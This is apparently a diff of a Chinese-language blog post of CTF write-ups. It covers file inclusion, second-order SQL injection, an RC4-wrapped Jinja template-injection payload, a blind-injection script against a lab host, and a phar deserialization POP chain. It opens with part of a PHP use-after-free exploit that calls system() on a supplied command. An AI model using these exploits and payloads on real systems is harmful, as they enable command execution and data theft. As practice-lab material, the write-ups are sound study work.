&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_binary_base($binary_leak) &#123;</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = leak($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) &#123; # ELF header</span><br><span class="line">                return $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, 0, 6);</span><br><span class="line"></span><br><span class="line">            if($f_name == 0x6d6574737973) &#123; # system</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        &#125; while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class ryat &#123;</span><br><span class="line">        var $ryat;</span><br><span class="line">        var $chtg;</span><br><span class="line"></span><br><span class="line">        function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;chtg = $this-&gt;ryat;</span><br><span class="line">            $this-&gt;ryat = 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Helper &#123;</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class="line">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = 10; # increase this value if you get segfaults</span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(&#x27;A&#x27;, 79);</span><br><span class="line"></span><br><span class="line">    $poc = &#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[0] = ptr2str(0, 79);</span><br><span class="line">    unset($v);</span><br><span class="line">    $abc = $out[2][0];</span><br><span class="line"></span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;</span><br><span class="line">        die(&quot;UAF failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # leaks</span><br><span class="line">    $closure_handlers = str2ptr($abc, 0);</span><br><span class="line">    $php_heap = str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr = $php_heap - 0xc8;</span><br><span class="line"></span><br><span class="line">    # fake value</span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"></span><br><span class="line">    # fake reference</span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, 8);</span><br><span class="line">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # fake closure object</span><br><span class="line">    $fake_obj_offset = 0xd0;</span><br><span class="line">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # pwn</span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); # internal func type</span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler</span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202004375.png" alt="image-20240620200423324"></p>
+<p>之后访问1.php</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202004946.png" alt="image-20240620200439923"></p>
+<p>[网鼎杯 2020 半决赛]AliceWebsite</p>
+<p>发现源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">       $action = (isset($_GET[&#x27;action&#x27;]) ? $_GET[&#x27;action&#x27;] : &#x27;home.php&#x27;);</span><br><span class="line">       if (file_exists($action)) &#123;</span><br><span class="line">           include $action;</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           echo &quot;File not found!&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">       ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>很快发现文件包含</p>
+<p>同时我们发现这里有一个文件包含,上面的代码并没有任何限制,可以利用可控变量action来访问flag</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406201909085.png" alt="image-20240620190853439"></p>
+<p>October 2019 Twice SQL Injection</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192151163.png" alt="image-20240619215157126"></p>
+<p>题目告诉了我二次注入，我就先登录进去看看</p>
+<p>随便注册</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192152391.png" alt="image-20240619215237364"></p>
+<p>在这一块，输入 ‘ 会被转义，但是我们发现并没有其他的什么特殊限制，所以可以大胆猜测在注册界面二次注入</p>
+<p>所以首先，我们尝试一些恶意注册的名字</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select database() #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192155487.png" alt="image-20240619215549456"></p>
+<p>很好，所以之后还是继续爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27; #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192156562.png" alt="image-20240619215634536"></p>
+<p>猜测在flag中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192157836.png" alt="image-20240619215718815"></p>
+<p>最后爆字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select flag from flag #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192157802.png" alt="image-20240619215755771"></p>
 <p>拿到flag</p>
-<p>[SWPUCTF 2018]SimplePHP</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240606215028319.png" alt="image-20240606215028319"></p>
-<p>点击到查看文件，发现有传参！！！</p>
-<p>file？直接file.php</p>
-<p>查看一下</p>
-<p>file.php</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;); </span><br><span class="line">include &#x27;function.php&#x27;; </span><br><span class="line">include &#x27;class.php&#x27;; </span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); </span><br><span class="line">$file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; </span><br><span class="line">if(empty($file)) &#123; </span><br><span class="line">  echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">$show = new Show(); </span><br><span class="line">if(file_exists($file)) &#123; </span><br><span class="line">  $show-&gt;source = $file; </span><br><span class="line">  $show-&gt;_show(); </span><br><span class="line">&#125; else if (!empty($file))&#123; </span><br><span class="line">  die(&#x27;file doesn\&#x27;t exists.&#x27;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>[CISCN2019 华东南赛区]Double Secret</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192137333.png" alt="image-20240619213707600"></p>
+<p>我们首先访问一下screct页面</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192137126.png" alt="image-20240619213758089"></p>
+<p>要我们说secret，猜测是传参数secret</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192138993.png" alt="image-20240619213851969"></p>
+<p>传1进去是d</p>
+<p>传参传长一点试试</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192139377.png"></p>
+<p>发现报错，在其中发现源码泄露</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192139280.png" alt="image-20240619213957241"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">File &quot;/app/app.py&quot;, line 35, in secret</span><br><span class="line">    if(secret==None):</span><br><span class="line">        return &#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span><br><span class="line">    rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密</span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line"> </span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"> </span><br><span class="line">    if &#x27;ciscn&#x27; in a.lower():</span><br><span class="line">Open an interactive python shell in this frame        return &#x27;flag detected!&#x27;</span><br><span class="line">    return a</span><br></pre></td></tr></table></figure>
 
-<p>function.php</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//show_source(__FILE__); </span><br><span class="line">include &quot;base.php&quot;; </span><br><span class="line">header(&quot;Content-type: text/html;charset=utf-8&quot;); </span><br><span class="line">error_reporting(0); </span><br><span class="line">function upload_file_do() &#123; </span><br><span class="line">    global $_FILES; </span><br><span class="line">    $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; </span><br><span class="line">    //mkdir(&quot;upload&quot;,0777); </span><br><span class="line">    if(file_exists(&quot;upload/&quot; . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); </span><br><span class="line">    echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;; </span><br><span class="line">&#125; </span><br><span class="line">function upload_file() &#123; </span><br><span class="line">    global $_FILES; </span><br><span class="line">    if(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">function upload_file_check() &#123; </span><br><span class="line">    global $_FILES; </span><br><span class="line">    $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); </span><br><span class="line">    $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    if(empty($extension)) &#123; </span><br><span class="line">        //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    else&#123; </span><br><span class="line">        if(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            return true; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>所以，我们可以发现传进去的参数是被使用rc4解密了，所以我们应该将要传进去的内容进行加密</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">def rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):</span><br><span class="line">    # print(&quot;RC4加密主函数&quot;)</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    return  crypt</span><br><span class="line">def rc4_init_sbox(key):</span><br><span class="line">    s_box = list(range(256))  </span><br><span class="line">    # print(&quot;原来的 s 盒：%s&quot; % s_box)</span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % 256</span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span><br><span class="line">    return s_box</span><br><span class="line">def rc4_excrypt(plain, box):</span><br><span class="line">    # print(&quot;调用加密程序成功。&quot;)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = 0</span><br><span class="line">    for s in plain:</span><br><span class="line">        i = (i + 1) % 256</span><br><span class="line">        j = (j + box[i]) % 256</span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % 256</span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = &quot;&quot;.join(res)</span><br><span class="line">    print(&quot;加密后的字符串是：%s&quot; %quote(cipher))</span><br><span class="line">    return (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span><br><span class="line">rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>class.php</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($key,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#x27;hacker!&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker~&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>rc4加密脚本如上</p>
+<p>最后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span><br></pre></td></tr></table></figure>
 
-<p>base.php</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    session_start(); </span><br><span class="line">?&gt; </span><br><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt; </span><br><span class="line">    &lt;title&gt;web3&lt;/title&gt; </span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt; </span><br><span class="line">    &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">    &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">    &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt; </span><br><span class="line">        &lt;div class=&quot;container-fluid&quot;&gt; </span><br><span class="line">        &lt;div class=&quot;navbar-header&quot;&gt; </span><br><span class="line">            &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;首页&lt;/a&gt; </span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">            &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt; </span><br><span class="line">                &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;查看文件&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">                &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;上传文件&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;/ul&gt; </span><br><span class="line">            &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; </span><br><span class="line">                &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#x27;REMOTE_ADDR&#x27;];?&gt;&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;/ul&gt; </span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">    &lt;/nav&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line">&lt;!--flag is in f1ag.php--&gt;</span><br></pre></td></tr></table></figure>
+<p>将其上传为secret参数</p>
+<p>得到flag</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192145367.png" alt="image-20240619214531334"></p>
+<p>[网鼎杯2018]Unfinish</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406171940478.png" alt="image-20240617193917708"></p>
+<p>sql注入是这样的</p>
+<p>看了一眼登录界面，什么也没有</p>
+<p>放心了</p>
+<p>肯定是有注册页面</p>
+<p>register.php</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406171941008.png" alt="image-20240617194105969"></p>
+<p>先随便注册一个</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406171952499.png" alt="image-20240617195201465"></p>
+<p>登录发现回显的用户名</p>
+<p>这包的是二次注入的</p>
+<p>就是不知道怎么注入</p>
+<p>尝试了一下常规注入好像不大行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;+ascii(substr(database() from 1 for 1))+&#x27;0</span><br></pre></td></tr></table></figure>
 
-<p>接下来就是激情澎湃的审计时间，笑死</p>
-<p>慢慢看吧</p>
-<p>不难看出是pop链的题</p>
-<p>这道题就是将对象作为字符串进行跳转</p>
-<p>class.php中</p>
-<p>进入__toString函数之后需要str[‘str’]寻找source函数</p>
-<p>如果找不到就可以跳转__get函数</p>
-<p>但是只有Test类才有__get函数，那么就让str[‘str’]返回的对象为Test对象</p>
-<p>多好啊</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>看了一下大佬的wp</p>
+<p>通过ascii码来进行读取</p>
+<p>同时使用from for代替逗号</p>
+<p>同时过滤了information</p>
+<p>所以表名只能靠猜，所以猜测是flag</p>
+<p>回到题目</p>
+<p>这样的注入是因为在一开始尝试了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(substr(database() from 1 for 1))</span><br></pre></td></tr></table></figure>
 
-<p>之后就在Test看看，发现参数</p>
-<p>和get、file_get、file_get_contents</p>
-<p>也就是toString中str触发get函数之后还会接着触发file_get和file_get_contents</p>
-<p>所以，emm</p>
-<p>差不多</p>
-<p>接着就是看看怎么进入toString</p>
-<p>也很简单</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现回显的是字符串所以猜测将上传的username两边加了引号</p>
+<p>payload则是为了闭合引号</p>
+<p>所以写脚本爆flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import logging</span><br><span class="line">import re</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line"># LOG_FORMAT = &quot;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s&quot;</span><br><span class="line"># logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)</span><br><span class="line"></span><br><span class="line">def search():</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    url = &#x27;http://fd61fced-c80d-4436-aa4e-b3aa75cf7fae.node5.buuoj.cn:81/&#x27;</span><br><span class="line">    url1 = url+&#x27;register.php&#x27;</span><br><span class="line">    url2 = url+&#x27;login.php&#x27;</span><br><span class="line">    for i in range(100):</span><br><span class="line">        sleep(0.3)#不加sleep就429了QAQ</span><br><span class="line">        data1 = &#123;&quot;email&quot; : &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;username&quot; : &quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;.format(i), &quot;password&quot; : &quot;123&quot;&#125;</span><br><span class="line">        data2 = &#123;&quot;email&quot; : &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;password&quot; : &quot;123&quot;&#125;</span><br><span class="line">        r1 = requests.post(url1, data=data1)</span><br><span class="line">        r2 = requests.post(url2, data=data2)</span><br><span class="line">        res = re.search(r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;,r2.text)</span><br><span class="line">        res1 = re.search(r&#x27;\d+&#x27;, res.group())</span><br><span class="line">        flag = flag+chr(int(res1.group()))</span><br><span class="line">        print(flag)</span><br><span class="line">    print(&quot;final:&quot;+flag)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    search()</span><br></pre></td></tr></table></figure>
 
-<p>发现str，也就是说，这里可以直接通过destruct进入toString，真不错</p>
-<p>所以我们写脚本生成序列化，将文件写入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str[&#x27;str&#x27;] = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params[&#x27;source&#x27;] = &#x27;/var/www/html/f1ag.php&#x27;;		// 一定要是绝对路径</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c = new Test;</span><br><span class="line">$b = new Show($c);</span><br><span class="line">$a = new C1e4r($b);</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;phar.jpg&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;__HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($a);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
-
-<p>真不错</p>
-<p>生成的phar文件就在脚本文件夹内</p>
-<p>改后缀jpg上传</p>
-<p>之后查看upload</p>
-<p>发现文件</p>
